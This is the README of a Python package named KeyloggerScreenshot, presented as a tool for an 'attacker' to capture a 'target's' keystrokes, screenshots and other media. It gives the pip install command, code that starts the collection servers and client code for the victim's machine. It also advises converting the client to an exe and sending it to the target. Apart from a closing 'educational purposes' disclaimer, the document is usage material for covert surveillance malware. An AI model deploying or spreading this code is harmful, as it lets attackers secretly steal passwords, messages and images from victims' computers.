KeyloggerScreenshot
===================

Created by: Fawaz Bashiru

KeyloggerScreenshot allows the attacker to get all the information the target was typing and a screenshot of a specific minutes which is being calculated in the script

To install KeyloggerScreenshot simply type:

`pip install KeyloggerScreenshot`

In your terminal

HOW DOES KeyloggerScreenshot WORK?
==================================

This module can be used in Windows and Linux
The servers can now be run in the same file with the module threading

For example:

Servers
------
```python
#EveryServer.py:
import KeyloggerScreenshot as ks
import threading

ip_keylogger, port_keylogger = "127.0.0.1", 5678
server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)

ip_photos, port_photos = "127.0.0.1", 1232
server_photos = ks.ServerPhotos(ip_photos, port_photos)

ip_listener, port_listener = "127.0.0.1", 7900
server_listener = ks.ServerListener(ip_listener, port_listener)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

```

Every screenshots, photos and audio files will be saved locally where your server is located

Client_Target
-------------
```python
#client_target.py
import KeyloggerScreenshot as ks

key_client = ks.KeyloggerTarget("127.0.0.1", 1234, "127.0.0.1",5678,"127.0.0.1",7900, duration_in_seconds=300)
key_client.start()

```

Additional
==========
* You can send "client_target.py" as an exe file to the target with "auto-py-to-exe"

* KeyloggerScreenshot is very easy to use.

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.